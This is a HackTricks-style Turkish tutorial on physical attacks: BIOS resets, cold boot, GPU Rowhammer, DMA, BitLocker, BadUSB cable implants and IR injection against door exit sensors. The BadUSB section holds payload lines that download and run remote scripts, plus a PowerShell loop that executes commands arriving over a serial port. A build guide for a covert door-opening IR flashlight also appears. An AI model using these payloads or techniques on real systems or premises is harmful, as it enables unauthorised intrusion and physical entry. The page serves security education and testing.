# Fiziksel Saldırılar

{{#include ../banners/hacktricks-training.md}}

## BIOS Parola Kurtarma ve Sistem Güvenliği

Eski PC firmware ayarları, CMOS pilini çıkararak veya belgelenmiş bir clear-CMOS jumper kullanarak sıfırlanabilir. Gerekli güç kesme süresi anakarta bağlıdır. Modern UEFI parolaları veya anahtarları kalıcı bellekteki flash’ta, gömülü bir denetleyicide ya da bir güvenlik aygıtında saklanabilir ve bu nedenle pil çıkarıldıktan sonra da kalabilir. Pinleri kısa devre etmeden önce anakart/servis kılavuzuna başvurun; bu işlem TPM ölçümlerini de geçersiz kılabilir ve disk şifreleme kurtarma sürecini tetikleyebilir.

Eski x86 sistemlerinde **killCMOS** ve **CmosPwd** gibi araçlar, önyüklenebilir bir ortamdan CMOS destekli ayarları inceleyebilir veya değiştirebilir. CmosPwd, belgelenmiş eski BIOS ailelerinin parola biçimlerini tanır ve CMOS durumunu yedekleyebilir, geri yükleyebilir veya silebilir/sonlandırabilir; yayımlanmış derlemeleri eski DOS/Windows, Linux, FreeBSD ve NetBSD ortamlarını hedefler.<sup>[[18]](#references)</sup> Bu yardımcı programlar genel amaçlı UEFI parola kaldırıcıları değildir ve yeterli donanım/firmware erişimi gerektirir.

Bazı dizüstü bilgisayar firmware’leri, birkaç başarısız parola denemesinden sonra üreticiye özgü bir sorgulama kodu gösterir. [bios-pw.org](https://bios-pw.org) gibi veritabanları, bazı modeller için eski üretici kurtarma parolalarını türetebilir; ancak birçok sistem, türetilebilir bir sorgulama kodu olmadan kilitlenme uygular. Oluşturulan parolaları modele özgü kabul edin ve kalıcı deneme sayaçlarını tüketmekten kaçının.

### UEFI Güvenliği

Modern **UEFI** sistemlerinde CHIPSEC, Secure Boot değişken korumalarını denetleyebilir. Önce aşağıdaki değişiklik yapmayan denetimi çalıştırın; isteğe bağlı `-a modify` modu, değişkenleri bozmayı kasıtlı olarak dener ve yalnızca kurtarılabilir bir laboratuvar sisteminde kullanılmalıdır. CHIPSEC’in kendisi, ayrıcalıklı sürücüsünün ve düşük seviyeli donanım erişiminin üretim uç noktalarında kullanıma uygun olmadığı konusunda uyarır.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM Analizi ve Cold Boot Saldırıları

DRAM'deki her bit, yenileme durduğunda hemen kaybolmaz. Verilerin bozulma hızı modül teknolojisine ve sıcaklığa göre önemli ölçüde değişir; soğutma, kullanılabilir verileri soğutulmadan yapılan bir güç kesintisinden çok daha uzun süre koruyabilir. Cold-boot saldırısında bellek hızla küçük bir edinim ortamına yeniden başlatılır veya soğutulmuş bir modül aktarılır, ham bellek yakalanır ve bit bozulmasına rağmen kriptografik anahtarlar yeniden oluşturulur. Disk kopyalama aracı otomatik olarak fiziksel bellek görüntüleme aracı değildir ve Volatility veriyi edinmek yerine yakalanan veriyi analiz eder; platforma uygun, doğrulanmış bir edinim aracı kullanın.<sup>[[12]](#references)</sup>

---

## Sayfa Tablolarını Hedefleyen GPU Rowhammer

Modern GPU Rowhammer saldırıları, sıradan arabellekler yerine **GPU sanal bellek meta verilerini** hedeflediklerinde çok daha etkili olur. **GDDR6 NVIDIA Ampere GPU'lar** üzerinde yapılan yakın tarihli çalışmalar, ayrıcalıksız CUDA kodu çalıştıran bir saldırganın GPU'ya özgü hammering desenleri oluşturabildiğini, sayfalama yapılarını savunmasız satırlara yerleştirmek için **bellek düzenlemesi** yapabildiğini ve ardından **son seviye sayfa tablosundaki** veya ara bir **sayfa dizinindeki** bitleri değiştirebildiğini gösteriyor. Tek bir adres çeviri girdisi bozulduğunda saldırgan **keyfi GPU belleğinde okuma/yazma** yeteneği kazanabilir ve ardından ana makineyi ele geçirmeye geçebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Saldırı Örneği

1. GDDR6'da **hammering uygulanabilen satırların profilini çıkarın** ve DRAM içi önlemleri aşan, yenileme düzenini dikkate alan / eşit olmayan hammering desenleri oluşturun.
2. Sürücünün sayfa çeviri yapılarını varsayılan korumalı havuzda tutmak yerine hammering uygulanabilen fiziksel konumlara yerleştirmesi için **GPU ayırmalarını düzenleyin**. Uygulamada bu, düşük bellekli sayfa tablosu bölgesini tüketmeyi ve büyük seyrek UVM eşlemelerini denetimli adımlarla dağıtmayı içerebilir.
3. Sayfa tablosu / sayfa dizini girdisindeki **PFN** veya aperture ile ilgili bitler gibi **çeviri meta verilerini değiştirin**; böylece saldırganın denetimindeki sanal sayfa sayfa tablosu sayfalarına, keyfi GPU belleğine veya ana makinenin görebildiği sistem eşlemelerine karşılık gelsin.
4. Sahte eşlemeyi yeniden kullanarak ek çeviri girdilerinin üzerine yazın ve GPU bağlamları arasında **keyfi GPU belleğinde okuma/yazma** yetkisini yükseltin.

### Ana Makineye Geçiş ve Azaltımlar

- **IOMMU devre dışıyken**, sahte sistem aperture eşlemeleri GPU'ya keyfi **ana makine fiziksel belleğine** erişim sağlayarak GPU ilkelini ana makinenin tamamen ele geçirilmesine dönüştürebilir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** son seviye sayfa tablosu girdilerini hedeflerken, **GeForge** sayfa dizini katmanını bozmanın daha kolay olabileceğini gösteriyor; çünkü tek bir bit değişikliği daha büyük bir çeviri alt ağacını yeniden hedefleyebilir. Yalnızca tek bir sayfalama katmanını güvenlik açısından kritik kabul etmeyin.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**, GDDRHammer/GeForge'un kullandığı ana makine belleğine doğrudan keyfi erişim yolunu engellediğinden önemini korur; ancak **tam bir azaltım değildir**. **GPUBreach**, saldırganın GPU tarafından yazılabilir, sürücüye ait CPU arabelleklerini bozduğu ve ardından NVIDIA sürücüsündeki bellek güvenliği hatalarını tetikleyerek IOMMU etkin olsa bile çekirdeğe yazma ilkeli ve **root shell** elde ettiği ikinci aşamalı bir geçiş gösteriyor.<sup>[[3]](#references)</sup>
- Desteklenen iş istasyonu/sunucu GPU'larında **sistem düzeyinde ECC** pratik bir sağlamlaştırma adımıdır. ECC'siz tüketici GPU'ları daha zayıf bir savunma yüzeyi sunar.<sup>[[4]](#references)</sup>
- Bu saldırılar yalnızca teorik değildir: **GeForge**, RTX 3060'da **1.171**, RTX A6000'da ise **202** bit değişikliği bildirdi; bu, çalışan bir ana makine ayrıcalık yükseltme zinciri oluşturmak için yeterliydi.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Doğrudan Bellek Erişimi (DMA) Saldırıları

Önyükleme öncesi IOMMU zorlamasını düşürüp bir Windows DMA zincirini etkinleştirebilen çevrimdışı UEFI IFR/NVRAM yamalama için bkz.:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**, geçmişteki oturum açma atlatma imzaları da dahil olmak üzere FireWire ve ilk Thunderbolt yapılandırmaları gibi arayüzler üzerinden **DMA tabanlı bellek edinimini ve yamalamayı** gösterir. Bu, yalnızca “Windows 10'da etkisiz” değildir: istismar edilebilirlik arayüze, hedef yapıya, IOMMU politikasına, kilit durumuna ve Windows Kernel DMA Protection'ın desteklenip etkinleştirilmiş olmasına bağlıdır. Windows 10 sürüm 1803 ve sonrası, uyumlu platformlarda Kernel DMA Protection'ı kullanıma sunarak saldırı yüzeyini önemli ölçüde değiştirdi.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Sisteme Erişim için Live CD/USB

Şifrelenmemiş veya kilidi zaten açılmış bir Windows biriminde, çevrimdışı bir ortam **sethc.exe** veya **Utilman.exe** gibi erişilebilirlik ikililerini **cmd.exe** ile değiştirebilir; ilgili oturum açma ekranı kısayolu çalıştırıldığında SYSTEM komut istemi açılır. **chntpw** gibi araçlar yerel SAM hesabı verilerini düzenleyebilir. Bu yöntemler kilitli bir BitLocker birimini atlatmaz ve DPAPI/EFS ile korunan kimlik bilgilerine zarar verebilir; adli kopyaları ve yedekleri koruyun.

**Kon-Boot**, desteklenen Windows/macOS yapılandırmaları için ticari bir önyükleme zamanı kimlik doğrulama atlatma aracıdır. Uyumluluk işletim sistemine, firmware moduna, Secure Boot'a ve disk şifreleme yapılandırmasına bağlıdır; BitLocker ile kilitlenmiş bir birimin şifresini çözmez.<sup>[[10]](#references)</sup>

---

## Windows Güvenlik Özelliklerini Ele Alma

### Önyükleme ve Kurtarma Kısayolları

- **Delete/Supr**, F2, F10 veya başka bir üretici tuşu firmware kurulumunu açabilir.
- **F8**, yalnızca bu yolun hâlâ etkin olduğu yapılandırmalarda eski Windows gelişmiş önyükleme seçeneklerini açar; güncel kurtarma seçeneklerine erişim değişiklik gösterir.
- **Shift** tuşunu basılı tutmak bazı yapılandırmalarda Windows'un otomatik oturum açmasını engelleyebilir; ancak ilke/kayıt defteri ayarları bu davranışı devre dışı bırakabilir.<sup>[[17]](#references)</sup>

### BAD USB Aygıtları

**USB Rubber Ducky** ve Teensy kartları gibi aygıtlar, güvenilir HID klavyeler olarak tanınıp önceden tanımlanmış tuş vuruşlarını enjekte edebilir. Yük başlangıçta oturum açmış kullanıcının ayrıcalıklarına ve masaüstü erişimine sahiptir; UAC istemleri, ekran kilidi, klavye düzeni, zamanlama ve uç nokta USB ilkesi yine de kısıtlayıcıdır.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Yönetici veya yedekleme ayrıcalıkları, **SAM** ve **SYSTEM** gibi kilitli dosyaların edinilebilmesi için bir gölge kopya oluşturmayı veya kayıt defteri kovanlarını kaydetmeyi mümkün kılar. Bu, ayrıcalık atlatma değil, ele geçirme sonrası bir veri toplama tekniğidir; `diskshadow`/VSS ve kayıt defteri kovanı dışa aktarma olaylarıyla ilişkilendirilmelidir.

## BadUSB / HID Implant Teknikleri

### Wi-Fi yönetimli kablo implantları

- **Evil Crow Cable Wind** gibi ESP32-S3 tabanlı implantlar USB-A→USB-C veya USB-C↔USB-C kabloların içine gizlenir, yalnızca USB klavye olarak tanınır ve C2 yığınını Wi-Fi üzerinden sunar. Operatörün kabloya kurbanın ana makinesinden güç vermesi, `Evil Crow Cable Wind` adlı ve `123456789` parolalı bir erişim noktası oluşturması ve gömülü HTTP arayüzüne ulaşmak için [http://cable-wind.local/](http://cable-wind.local/) adresine (veya DHCP adresine) gitmesi yeterlidir.<sup>[[8]](#references)</sup>
- Tarayıcı arayüzünde *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* sekmeleri bulunur. Saklanan yükler işletim sistemine göre etiketlenir, klavye düzenleri anında değiştirilir ve VID/PID dizeleri bilinen çevre birimlerini taklit edecek şekilde değiştirilebilir.
- C2 kablonun içinde bulunduğundan telefon, kuruluşun ağını kullanmadan yükleri hazırlayabilir, çalıştırmayı başlatabilir ve Wi-Fi kimlik bilgilerini yönetebilir. Bu, kısa süreli fiziksel sızmalar için kullanışlıdır.

### İşletim sistemini algılayan AutoExec yükleri

- AutoExec kuralları, USB tanınır tanınmaz çalıştırılmak üzere bir veya daha fazla yük bağlar. İmplant, işletim sistemini hafif yöntemlerle parmak izler ve eşleşen betiği seçer.
- Örnek iş akışı:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Çalıştırma gözetimsiz olduğundan, yalnızca bir şarj kablosunu değiştirmek oturum açmış kullanıcının bağlamında “tak ve ele geçir” ilk erişimini sağlayabilir.

### Wi-Fi TCP üzerinden HID ile başlatılan uzak shell

1. **Tuş vuruşuyla başlatma:** Saklanan bir yük, konsol açar ve yeni USB seri aygıtına ulaşan her şeyi çalıştıran bir döngü yapıştırır. Basit bir Windows örneği:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant, ESP32-S3'ü operatöre geri bağlanan bir TCP client (Python script, Android APK veya masaüstü executable) başlatırken USB CDC kanalını açık tutar. TCP oturumuna yazılan tüm baytlar yukarıdaki seri döngüye aktarılır ve böylece air-gapped host'larda bile uzaktan komut yürütme sağlanır. Çıktı sınırlıdır, bu nedenle operatörler genellikle kör komutlar (hesap oluşturma, ek araçları hazırlama vb.) çalıştırır.

### HTTP OTA update yüzeyi

- Belgelenen Evil Crow Cable Wind arayüzü, kimlik doğrulaması gerektirmeyen bir firmware update endpoint'i olan `/update` adresini sunar:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Saha operatörleri, kabloyu açmadan etkileşim sırasında özellikleri anında değiştirebilir (ör. USB Army Knife firmware’ini flash’lamak); böylece implant hedef ana makineye bağlı kalırken yeni yeteneklere geçebilir.

## BitLocker Şifrelemesini Atlatma

Canlı veya yakın zamanda çalışmış bir sistemden yetkili adli edinim yapılırken, birim kilidi açık durumdayken BitLocker birim ana anahtarı ya da ilgili anahtar materyali edinimde bulunabilir. Elcomsoft Forensic Disk Decryptor ve Passware Kit Forensic gibi ticari araçlar, desteklenen bellek imajlarında, hazırda bekletme dosyalarında veya çökme dökümlerinde arama yapabilir; ancak başarılı olma garantisi yoktur. Modern Windows, BitLocker etkin olduğunda çökme dökümlerini de şifreler. Ayrıca saklanan 48 haneli kurtarma parolası, bellekteki birim anahtarından farklı bir artefakttır.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Kurtarma Anahtarı Eklemek İçin Sosyal Mühendislik

Saldırgan, bir yöneticiyi BitLocker yönetim komutlarını çalıştırmaya ikna ederek bir kurtarma parolası, harici anahtar veya başka bir koruyucu ekleyebilir ve ardından bunu ele geçirebilir. Kurtarma parolası, sıfırlardan oluşan rastgele bir dize olamaz: BitLocker sayısal kurtarma parolaları, doğrulamadan geçen 48 haneli bir biçime sahip olmalıdır. İlgili yetkili yönetim sözdizimi `manage-bde -protectors -add C: -recoverypassword` şeklindedir; eklenen koruyucuları `manage-bde -protectors -get C:` komutuyla listeleyin. Koruyucu eklemelerini izleyin ve yeni kurtarma materyalinin yalnızca onaylı konumlarda saklandığından emin olun.<sup>[[16]](#references)</sup>

---

## BIOS’u Fabrika Ayarlarına Sıfırlamak İçin Kasa Açılma / Bakım Anahtarlarından Yararlanma

Birçok modern dizüstü bilgisayarda ve küçük boyutlu masaüstü bilgisayarda, Embedded Controller (EC) ve BIOS/UEFI firmware tarafından izlenen bir **kasa açılma anahtarı** bulunur. Anahtarın temel amacı cihaz açıldığında uyarı vermek olsa da bazı üreticiler, anahtar belirli bir düzende değiştirilince tetiklenen **belgelenmemiş bir kurtarma kısayolu** uygular.<sup>[[5]](#references)[[6]](#references)</sup>

### Saldırı Nasıl Çalışır

1. Anahtar, EC üzerindeki bir **GPIO kesmesine** bağlanır.
2. EC’de çalışan firmware, **basışların zamanlamasını ve sayısını** izler.
3. Önceden tanımlanmış bir düzen algılandığında EC, **sistem NVRAM/CMOS içeriğini silen** bir *anakart sıfırlama* yordamını çağırır.
4. Sonraki açılışta etkilenen modeller firmware durumunu sıfırlar. Üreticiye ve sürüme bağlı olarak sıfırlanan durum; gözetmen parolasını, özel önyükleme ayarlarını veya kaydedilmiş Secure Boot anahtarlarını içerebilir. TPM durumu ve disk şifrelemesine etkileri ayrıca değerlendirilmelidir.

> Firmware sıfırlaması harici aygıttan önyükleme seçeneklerini geri yükleyebilir, ancak **depolama biriminin şifresini çözmez**. BitLocker veya başka bir tam disk şifreleme sistemi, TPM/firmware değişikliklerinden sonra kurtarma moduna geçebilir ve kurtarma anahtarı olmadan dahili sürücüyü korumaya devam edebilir.<sup>[[16]](#references)</sup>

### Gerçek Dünya Örneği – Framework 13 Dizüstü Bilgisayarı

Framework 13 (11./12./13. nesil) için kurtarma kısayolu şöyledir:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Onuncu döngüden sonra EC, BIOS’a bir sonraki yeniden başlatmada NVRAM’i silmesi talimatını veren bir bayrak ayarlar. Tüm işlem yaklaşık 40 saniye sürer ve **bir tornavidadan başka hiçbir şey gerektirmez**.<sup>[[5]](#references)</sup>

### Genel Exploitation Prosedürü

1. EC’nin çalışır durumda olması için hedefi açın veya askıya alıp yeniden uyandırın.
2. Müdahale/bakım anahtarını açığa çıkarmak için alt kapağı çıkarın.
3. Üreticiye özgü aç-kapa düzenini uygulayın (belgelere ve forumlara bakın veya EC firmware’ini tersine mühendislikle inceleyin).
4. Cihazı tekrar birleştirip yeniden başlatın, ardından hangi firmware ayarlarının ve kimlik bilgilerinin gerçekten değiştiğini inceleyin.
5. Yetkiniz varsa ve harici önyükleme mümkünse, kontrolünüzdeki bir live image ile önyükleme yapın. Dahili bir birimin kilidi meşru yollarla açıldıktan sonra (veya birim hiç şifrelenmemişse), live ortam kimlik bilgilerini ve verileri edinebilir ya da EFI System Partition’ı inceleyebilir. Bu bölümü değiştirerek bir EFI implantı yüklemek kalıcı ve son derece müdahaleci bir işlemdir; ayrıca Secure Boot, ölçümlü önyükleme, firmware yazma koruması ve uç nokta izleme kısıtlamalarına tabidir. Şifreli depolama, anahtarı veya kurtarma materyali olmadan erişilemez.

### Tespit ve Azaltma

* İşletim sistemi yönetim konsolunda kasa müdahalesi olaylarını kaydedin ve beklenmedik BIOS sıfırlamalarıyla ilişkilendirin.
* Açılmayı tespit etmek için vidalarda/kapaklarda **müdahaleyi belli eden mühürler** kullanın.
* Cihazları **fiziksel olarak güvenli alanlarda** tutun; fiziksel erişimin tam güvenlik ihlali anlamına geldiğini varsayın.
* Varsa, üreticinin “bakım anahtarıyla sıfırlama” özelliğini devre dışı bırakın veya NVRAM sıfırlamaları için ek bir kriptografik yetkilendirme isteyin.

---

## Temassız Çıkış Sensörlerine Karşı Gizli IR Enjeksiyonu

### Sensör Özellikleri
- Piyasada bulunan “el sallayarak çıkış” sensörleri, yakın IR LED vericisini TV uzaktan kumandası tarzı bir alıcı modülle eşleştirir. Alıcı, yalnızca doğru taşıyıcının (~30 kHz) birden fazla darbesini (~4–10) algıladıktan sonra lojik yüksek sinyali verir.<sup>[[7]](#references)</sup>
- Plastik bir siperlik, vericiyle alıcının birbirini doğrudan görmesini engeller; böylece denetleyici, doğrulanmış taşıyıcının yakındaki bir yansımadan geldiğini varsayar ve kapı karşılığını açan röleyi çalıştırır.
- Denetleyici hedefin bulunduğuna kanaat getirdiğinde, çoğu zaman giden modülasyon zarfını değiştirir; ancak alıcı, filtrelenmiş taşıyıcıyla eşleşen her darbe dizisini kabul etmeyi sürdürür.

### Saldırı İş Akışı
1. **Yayım profilini yakalayın** – dahili IR LED’ini süren hem algılama öncesi hem de algılama sonrası dalga biçimlerini kaydetmek için denetleyici pinlerine bir lojik analizör bağlayın.
2. **Yalnızca “algılama sonrası” dalga biçimini yeniden oynatın** – stok vericiyi çıkarın veya devre dışı bırakın ve harici bir IR LED’ini baştan itibaren tetiklenmiş desenle sürün. Alıcı yalnızca darbe sayısını ve frekansı dikkate aldığından, sahte taşıyıcıyı gerçek bir yansıma gibi algılar ve röle hattını etkinleştirir.
3. **İletimi aralıklı hâle getirin** – alıcıdaki AGC’yi veya parazit işleme mantığını doyurmadan gereken en az darbe sayısını iletmek için taşıyıcıyı ayarlanmış aralıklarla gönderin (ör. onlarca milisaniye açık, benzer süre kapalı). Kesintisiz yayın, sensörün duyarlılığını hızla düşürür ve rölenin çalışmasını engeller.

### Uzun Menzilli Yansıtmalı Enjeksiyon
- Masaüstü LED’ini yüksek güçlü bir IR diyot, MOSFET sürücüsü ve odaklama optikleriyle değiştirmek, yaklaşık 6 m uzaktan güvenilir biçimde tetikleme sağlar.
- Saldırganın alıcı açıklığını doğrudan görmesi gerekmez; camın ardından görülebilen iç duvarlara, raflara veya kapı çerçevelerine ışını yöneltmek, yansıyan enerjinin yaklaşık 30°’lik görüş alanına girmesini sağlar ve yakından yapılan el sallama hareketini taklit eder.
- Alıcılar yalnızca zayıf yansımalar beklediğinden, çok daha güçlü bir harici ışın birden fazla yüzeyden yansıyıp yine de algılama eşiğinin üzerinde kalabilir.

### Silahlandırılmış Saldırı El Feneri
- Sürücüyü ticari bir el fenerinin içine yerleştirmek, aracı herkesin gözü önünde saklar. Görünür LED’i alıcının bandına uygun yüksek güçlü bir IR LED ile değiştirin, yaklaşık 30 kHz’lik darbeler üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED akımını toprağa çekmek için MOSFET kullanın.
- Teleskopik yakınlaştırma merceği, menzil ve hassasiyet için ışını daraltır. MCU denetimli titreşim motoru ise görünür ışık yaymadan modülasyonun etkin olduğuna dair dokunsal bildirim sağlar.
- Birkaç kayıtlı modülasyon deseni (biraz farklı taşıyıcı frekansları ve zarflar) arasında geçiş yapmak, yeniden markalanmış farklı sensör aileleriyle uyumluluğu artırır. Böylece operatör, röle duyulur biçimde tıklayıp kapı açılana kadar yansıtıcı yüzeyleri tarayabilir.

---

## References

- [1] [GDDRHammer: DRAM Satırlarını Büyük Ölçüde Bozma — Modern GPU’lardan Kaynaklanan Bileşenler Arası Rowhammer Saldırıları](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Eğlence ve Kâr İçin GPU Sayfa Tabloları Oluşturmak Üzere GDDR Belleğe Hammering Uygulama](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer Kullanarak GPU’lara Ayrıcalık Yükseltme Saldırıları](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Güvenlik Bildirimi: Rowhammer - Temmuz 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Buraya basıp sistemi ele geçirin”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Anakart Sıfırlama Rehberi](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Hayııır, Dokunmayın! – Gizli bir IR El Feneriyle Temassız IR Çıkış Sensörlerini Atlama”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Tak, Çalıştır, Sistemi Ele Geçir: Evil Crow Cable Wind ile Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Yongalarına Karşı Rowhammer Saldırısı](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot resmi belgeleri ve uyumluluk bilgileri](https://kon-boot.com/)
- [11] [CHIPSEC belgeleri - Secure Boot değişken korumaları](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Hatırladıklarımız: Şifreleme Anahtarlarına Yönelik Cold Boot Saldırıları](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA üzerinden fiziksel bellek manipülasyonu](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Koruması](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky belgeleri](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker işlemleri kılavuzu](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift tuşunu basılı tutma ve otomatik oturum açma davranışı](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd belgeleri ve indirmeler](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
